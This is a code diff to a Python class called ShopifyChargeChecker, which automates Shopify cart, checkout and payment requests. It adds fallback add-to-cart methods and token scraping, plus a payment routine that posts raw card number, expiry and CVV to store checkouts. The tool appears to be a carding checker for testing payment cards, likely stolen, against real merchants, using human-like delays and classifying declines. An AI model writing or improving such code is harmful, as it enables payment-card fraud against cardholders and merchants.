@@ -752,58 +752,76 @@ class ShopifyChargeChecker:
         try:
             logger.step(3, 8, "Adding to cart (V2 method)...")
             
-            # Try multiple variant IDs
-            for variant_id in self.variant_ids:
+            # Try multiple methods in sequence
+            methods = [
+                self.add_to_cart_ajax,
+                self.add_to_cart_form_direct,
+                self.add_to_cart_simple_form,
+                self.add_to_cart_quantity_update
+            ]
+            
+            for method in methods:
                 try:
-                    # Method 1: Direct AJAX call
-                    cart_url = f"{self.base_url}/cart/add.js"
-                    cart_data = {
-                        'items': [{
-                            'id': int(variant_id),
-                            'quantity': 1
-                        }]
-                    }
-                    
-                    cart_headers = self.get_shopify_headers(referer=self.product_url)
-                    cart_headers['Content-Type'] = 'application/json'
-                    cart_headers['X-Requested-With'] = 'XMLHttpRequest'
-                    
-                    response = await self.make_request(
-                        client, 'POST', cart_url,
-                        json=cart_data,
-                        headers=cart_headers
-                    )
-                    
-                    if response.status_code == 200:
-                        result = response.json()
-                        if 'items' in result:
-                            logger.success(f"Added variant {variant_id} to cart successfully")
-                            return True, None
-                    
+                    logger.debug_response(f"Trying method: {method.__name__}")
+                    success, result = await method(client)
+                    if success:
+                        logger.success(f"Cart added successfully using {method.__name__}")
+                        return True, None
+                    else:
+                        logger.warning(f"Method {method.__name__} failed: {result}")
                 except Exception as e:
-                    logger.warning(f"Variant {variant_id} failed: {str(e)}")
+                    logger.warning(f"Method {method.__name__} error: {str(e)}")
                     continue
             
-            # If all variants fail, try form method
-            return await self.add_to_cart_form(client)
+            # If all methods fail, try the emergency method
+            return await self.add_to_cart_emergency(client)
                 
         except Exception as e:
             return False, f"Add to cart V2 error: {str(e)}"
 
-    async def add_to_cart_form(self, client):
-        """Alternative form-based add to cart"""
+    async def add_to_cart_ajax(self, client):
+        """AJAX method for adding to cart"""
         try:
-            logger.step(3, 8, "Trying form-based add to cart...")
-            
-            # Use the first variant ID
+            # Use default variant ID
             variant_id = self.variant_ids[0]
             
-            # Create form data
+            cart_url = f"{self.base_url}/cart/add.js"
+            cart_data = {
+                'items': [{
+                    'id': int(variant_id),
+                    'quantity': 1
+                }]
+            }
+            
+            cart_headers = self.get_shopify_headers(referer=self.product_url)
+            cart_headers['Content-Type'] = 'application/json'
+            cart_headers['X-Requested-With'] = 'XMLHttpRequest'
+            
+            response = await self.make_request(
+                client, 'POST', cart_url,
+                json=cart_data,
+                headers=cart_headers
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                if 'items' in result and len(result['items']) > 0:
+                    return True, "AJAX method successful"
+            
+            return False, "AJAX method failed"
+        except Exception as e:
+            return False, f"AJAX error: {str(e)}"
+
+    async def add_to_cart_form_direct(self, client):
+        """Direct form submission method"""
+        try:
+            variant_id = self.variant_ids[0]
+            
             form_url = f"{self.base_url}/cart/add"
             form_data = {
                 'id': variant_id,
                 'quantity': '1',
-                'return_to': 'cart'
+                'return_to': '/cart'
             }
             
             form_headers = self.get_shopify_headers(referer=self.product_url)
@@ -816,7 +834,7 @@ class ShopifyChargeChecker:
             )
             
             if response.status_code in [200, 302]:
-                # Check if cart has items
+                # Check cart content
                 cart_check = await self.make_request(
                     client, 'GET', f"{self.base_url}/cart.js",
                     headers=self.get_shopify_headers(referer=form_url)
@@ -825,20 +843,142 @@ class ShopifyChargeChecker:
                 if cart_check.status_code == 200:
                     cart_data = cart_check.json()
                     if 'items' in cart_data and len(cart_data['items']) > 0:
-                        logger.success("Form-based add to cart successful")
-                        return True, None
+                        return True, "Form direct method successful"
             
-            return False, "Form-based add to cart failed"
-                
+            return False, "Form direct method failed"
         except Exception as e:
-            return False, f"Form-based add error: {str(e)}"
+            return False, f"Form direct error: {str(e)}"
+
+    async def add_to_cart_simple_form(self, client):
+        """Simple form method without return_to"""
+        try:
+            variant_id = self.variant_ids[0]
+            
+            form_url = f"{self.base_url}/cart/add"
+            form_data = f'id={variant_id}&quantity=1'
+            
+            form_headers = self.get_shopify_headers(referer=self.product_url)
+            form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            
+            response = await self.make_request(
+                client, 'POST', form_url,
+                data=form_data,
+                headers=form_headers
+            )
+            
+            # Even if response fails, check if cart has items
+            cart_check = await self.make_request(
+                client, 'GET', f"{self.base_url}/cart.json",
+                headers=self.get_shopify_headers(referer=form_url)
+            )
+            
+            if cart_check.status_code == 200:
+                cart_data = cart_check.json()
+                if 'items' in cart_data and len(cart_data['items']) > 0:
+                    return True, "Simple form method successful"
+            
+            return False, "Simple form method failed"
+        except Exception as e:
+            return False, f"Simple form error: {str(e)}"
+
+    async def add_to_cart_quantity_update(self, client):
+        """Update quantity method"""
+        try:
+            # First add with quantity 0, then update to 1
+            variant_id = self.variant_ids[0]
+            
+            # Add with quantity 0
+            add_url = f"{self.base_url}/cart/add.js"
+            add_data = {
+                'items': [{
+                    'id': int(variant_id),
+                    'quantity': 0
+                }]
+            }
+            
+            add_headers = self.get_shopify_headers(referer=self.product_url)
+            add_headers['Content-Type'] = 'application/json'
+            add_headers['X-Requested-With'] = 'XMLHttpRequest'
+            
+            await self.make_request(
+                client, 'POST', add_url,
+                json=add_data,
+                headers=add_headers
+            )
+            
+            # Now update to quantity 1
+            update_url = f"{self.base_url}/cart/update.js"
+            update_data = {
+                'updates': {
+                    variant_id: 1
+                }
+            }
+            
+            update_response = await self.make_request(
+                client, 'POST', update_url,
+                json=update_data,
+                headers=add_headers
+            )
+            
+            if update_response.status_code == 200:
+                result = update_response.json()
+                if 'items' in result:
+                    for item in result['items']:
+                        if str(item['id']) == variant_id and item['quantity'] == 1:
+                            return True, "Quantity update method successful"
+            
+            return False, "Quantity update method failed"
+        except Exception as e:
+            return False, f"Quantity update error: {str(e)}"
+
+    async def add_to_cart_emergency(self, client):
+        """Emergency method - bypass normal cart addition"""
+        try:
+            logger.warning("Using emergency cart addition method...")
+            
+            # Try to go directly to checkout with product in URL
+            direct_checkout_url = f"{self.base_url}/cart/{self.variant_ids[0]}:1"
+            
+            response = await self.make_request(
+                client, 'GET', direct_checkout_url,
+                headers=self.get_shopify_headers(referer=self.product_url)
+            )
+            
+            if response.status_code in [200, 302]:
+                # Check if we have a checkout token
+                html_content = response.text if response.status_code == 200 else ""
+                location = response.headers.get('location', '')
+                
+                # Extract token from redirect or page
+                token_pattern = r'checkouts/([a-zA-Z0-9]+)'
+                match = None
+                
+                if location:
+                    match = re.search(token_pattern, location)
+                
+                if not match and html_content:
+                    match = re.search(token_pattern, html_content)
+                
+                if match:
+                    self.checkout_token = match.group(1)
+                    logger.success(f"Emergency method got checkout token: {self.checkout_token}")
+                    return True, "Emergency method successful (got checkout token)"
+            
+            return False, "Emergency method failed"
+        except Exception as e:
+            return False, f"Emergency method error: {str(e)}"
 
     async def go_to_checkout_v2(self, client):
         """Improved checkout method for VPS"""
         try:
             logger.step(4, 8, "Going to checkout (V2 method)...")
             
-            # First, view cart
+            # First, check if we already have a checkout token
+            if self.checkout_token:
+                logger.success(f"Already have checkout token: {self.checkout_token}")
+                return True, None
+            
+            # Check cart first
             cart_url = f"{self.base_url}/cart"
             response = await self.make_request(
                 client, 'GET', cart_url,
@@ -848,28 +988,26 @@ class ShopifyChargeChecker:
             if response.status_code != 200:
                 return False, f"Cart page failed: {response.status_code}"
             
-            # Extract checkout token from multiple patterns
+            # Try to extract checkout token
             html_content = response.text
             token_patterns = [
                 r'checkouts/([a-zA-Z0-9]+)',
                 r'"checkout_url":"[^"]+checkouts/([a-zA-Z0-9]+)',
                 r'data-checkout-url="[^"]+checkouts/([a-zA-Z0-9]+)',
+                r'href="[^"]+checkouts/([a-zA-Z0-9]+)"',
             ]
             
             for pattern in token_patterns:
-                match = re.search(pattern, html_content)
+                match = re.search(pattern, html_content, re.IGNORECASE)
                 if match:
                     self.checkout_token = match.group(1)
-                    logger.success(f"Found checkout token: {self.checkout_token}")
+                    logger.success(f"Found checkout token in cart: {self.checkout_token}")
                     break
             
             if not self.checkout_token:
-                # Try to create checkout via AJAX
+                # Try to create checkout
                 checkout_url = f"{self.base_url}/checkout"
-                checkout_data = {
-                    'checkout': '',
-                    '_method': 'POST'
-                }
+                checkout_data = 'checkout='
                 
                 checkout_headers = self.get_shopify_headers(referer=cart_url)
                 checkout_headers['Content-Type'] = 'application/x-www-form-urlencoded'
@@ -881,43 +1019,45 @@ class ShopifyChargeChecker:
                 )
                 
                 if response.status_code in [200, 302]:
-                    # Extract token from redirect
+                    # Extract token from response
                     if response.status_code == 302:
                         location = response.headers.get('location', '')
                         if location:
                             token_match = re.search(r'checkouts/([a-zA-Z0-9]+)', location)
                             if token_match:
                                 self.checkout_token = token_match.group(1)
-                    logger.success("Checkout created successfully")
+                    elif response.status_code == 200:
+                        # Try to extract from page content
+                        page_content = response.text
+                        token_match = re.search(r'checkouts/([a-zA-Z0-9]+)', page_content)
+                        if token_match:
+                            self.checkout_token = token_match.group(1)
+                    
+                    if self.checkout_token:
+                        logger.success(f"Created checkout with token: {self.checkout_token}")
+                    else:
+                        logger.warning("Checkout created but no token found")
                 else:
                     return False, f"Checkout creation failed: {response.status_code}"
             
             if self.checkout_token:
-                # Visit checkout page
-                checkout_page = f"{self.base_url}/checkouts/{self.checkout_token}"
-                page_response = await self.make_request(
-                    client, 'GET', checkout_page,
-                    headers=self.get_shopify_headers(referer=cart_url)
-                )
-                
-                if page_response.status_code == 200:
-                    logger.success("Checkout page loaded")
-                    return True, None
+                return True, None
             
-            return False, "Checkout token not found"
+            return False, "Checkout token not found after all attempts"
                 
         except Exception as e:
             return False, f"Checkout V2 error: {str(e)}"
 
     async def get_checkout_data(self, client):
-        """Get checkout data via GraphQL - Simplified for VPS"""
+        """Get checkout data - Simplified for VPS"""
         try:
             logger.step(5, 8, "Fetching checkout data...")
             
             if not self.checkout_token:
-                return True, "No checkout token, skipping GraphQL"
+                logger.warning("No checkout token, skipping checkout data")
+                return True, "Skipped - no checkout token"
             
-            # Use a simpler approach - just get the checkout page
+            # Just visit checkout page to get basic data
             checkout_url = f"{self.base_url}/checkouts/{self.checkout_token}"
             response = await self.make_request(
                 client, 'GET', checkout_url,
@@ -925,22 +1065,24 @@ class ShopifyChargeChecker:
             )
             
             if response.status_code == 200:
-                # Extract session token from page
+                # Try to extract session token
                 html_content = response.text
-                token_pattern = r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)["\']'
-                match = re.search(token_pattern, html_content)
+                token_pattern = r'["\']?x-checkout-one-session-token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
+                match = re.search(token_pattern, html_content, re.IGNORECASE)
                 
                 if match:
                     self.x_checkout_one_session_token = match.group(1)
                     logger.success(f"Found session token: {self.x_checkout_one_session_token[:20]}...")
                 
-                logger.success("Checkout data fetched")
+                logger.success("Checkout page loaded")
                 return True, "Checkout data loaded"
             else:
-                return False, f"Checkout page failed: {response.status_code}"
+                logger.warning(f"Checkout page failed: {response.status_code}")
+                return True, f"Checkout page failed but continuing: {response.status_code}"
                 
         except Exception as e:
-            return False, f"Checkout data error: {str(e)}"
+            logger.warning(f"Checkout data error but continuing: {str(e)}")
+            return True, f"Checkout data error but continuing: {str(e)}"
 
     def generate_session_token(self):
         """Generate session token"""
@@ -953,7 +1095,7 @@ class ShopifyChargeChecker:
             logger.step(6, 8, "Filling shipping info...")
             
             if not self.checkout_token:
-                # Create a simple checkout without shipping info
+                # Create user info without checkout
                 return True, self.create_user_info()
             
             # Generate user info
@@ -972,7 +1114,7 @@ class ShopifyChargeChecker:
                 'address': self.fixed_address
             }
             
-            # Try to update shipping with pickup
+            # Try to update shipping info (optional)
             try:
                 shipping_url = f"{self.base_url}/checkouts/{self.checkout_token}/shipping_rates.json"
                 
@@ -996,21 +1138,20 @@ class ShopifyChargeChecker:
                 )
                 shipping_headers['Content-Type'] = 'application/json'
                 
-                response = await self.make_request(
+                await self.make_request(
                     client, 'POST', shipping_url,
                     json=shipping_data,
                     headers=shipping_headers
                 )
                 
-                if response.status_code == 200:
-                    logger.success("Shipping info submitted")
-            except:
-                logger.warning("Shipping info submission skipped")
+                logger.success("Shipping info submitted")
+            except Exception as e:
+                logger.warning(f"Shipping info submission skipped: {str(e)}")
             
             return True, user_info
                 
         except Exception as e:
-            # Return user info even if shipping fails
+            logger.warning(f"Shipping info error, creating basic user info: {str(e)}")
             return True, self.create_user_info()
 
     def create_user_info(self):
@@ -1040,7 +1181,7 @@ class ShopifyChargeChecker:
             # Try multiple payment methods
             payment_methods = [
                 self.submit_payment_direct,
-                self.submit_payment_graphql
+                self.submit_payment_simple
             ]
             
             for method in payment_methods:
@@ -1048,8 +1189,10 @@ class ShopifyChargeChecker:
                     success, result = await method(client, cc, mes, ano, cvv, user_info)
                     if success:
                         return success, result
+                    else:
+                        logger.warning(f"Payment method failed: {result}")
                 except Exception as e:
-                    logger.warning(f"Payment method failed: {str(e)}")
+                    logger.warning(f"Payment method error: {str(e)}")
                     continue
             
             return False, "PAYMENT_ERROR: All payment methods failed"
@@ -1130,47 +1273,53 @@ class ShopifyChargeChecker:
         else:
             return False, f"SERVER_ERROR: Status {response.status_code}"
 
-    async def submit_payment_graphql(self, client, cc, mes, ano, cvv, user_info):
-        """GraphQL payment submission"""
-        if not self.x_checkout_one_session_token:
-            return False, "SESSION_ERROR: No session token"
+    async def submit_payment_simple(self, client, cc, mes, ano, cvv, user_info):
+        """Simple payment submission with minimal data"""
+        payment_url = f"{self.base_url}/checkouts/{self.checkout_token}/payments.json"
         
-        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
-        
-        graphql_headers = self.get_graphql_headers()
-        
-        graphql_payload = {
-            "operationName": "SubmitForCompletion",
-            "variables": {
-                "input": {
-                    "sessionInput": {
-                        "locale": "en-US",
-                        "countryCode": "US"
-                    },
-                    "attemptToken": f"{self.checkout_token}-{int(time.time())}",
-                    "metafields": []
+        payment_data = {
+            "payment": {
+                "credit_card": {
+                    "number": cc.replace(' ', ''),
+                    "name": f"{user_info['first_name']} {user_info['last_name']}",
+                    "month": mes,
+                    "year": ano[-2:],
+                    "verification_value": cvv
                 }
-            },
-            "id": "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
+            }
         }
         
+        payment_headers = self.get_shopify_headers(
+            referer=f"{self.base_url}/checkouts/{self.checkout_token}"
+        )
+        payment_headers['Content-Type'] = 'application/json'
+        
         response = await self.make_request(
-            client, 'POST', graphql_url,
-            json=graphql_payload,
-            headers=graphql_headers
+            client, 'POST', payment_url,
+            json=payment_data,
+            headers=payment_headers
         )
         
         if response.status_code == 200:
             result = response.json()
-            if 'data' in result and 'submitForCompletion' in result['data']:
-                completion = result['data']['submitForCompletion']
-                if 'payment' in completion and completion['payment'].get('status') == 'SUCCESS':
-                    logger.success("GraphQL payment successful")
-                    return True, "Payment successful"
             
-            return False, "GRAPHQL_ERROR: Payment submission failed"
+            if 'error' in result:
+                error_msg = result['error']
+                error_type = self.detect_error_type(error_msg)
+                return False, f"{error_type}: {self.clean_error_message(error_msg)}"
+            
+            if 'transaction' in result:
+                transaction = result['transaction']
+                if transaction.get('status') == 'success':
+                    return True, "Payment successful"
+                else:
+                    error_msg = transaction.get('message', 'Payment failed')
+                    error_type = self.detect_error_type(error_msg)
+                    return False, f"{error_type}: {self.clean_error_message(error_msg)}"
+            
+            return False, "TRANSACTION_ERROR: No transaction data"
         
-        return False, f"GRAPHQL_ERROR: Status {response.status_code}"
+        return False, f"SIMPLE_PAYMENT_ERROR: Status {response.status_code}"
 
     async def complete_checkout(self, client):
         """Complete the checkout - Simplified for VPS"""
@@ -1337,7 +1486,7 @@ class ShopifyChargeChecker:
 
                 await self.human_delay(1, 3)
 
-                # Step 3: Add to cart (V2 method)
+                # Step 3: Add to cart (V2 method with multiple techniques)
                 success, error = await self.add_to_cart_v2(client)
                 if not success:
                     return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Add to cart failed: {error}", username, time.time()-start_time, user_data, bin_info)
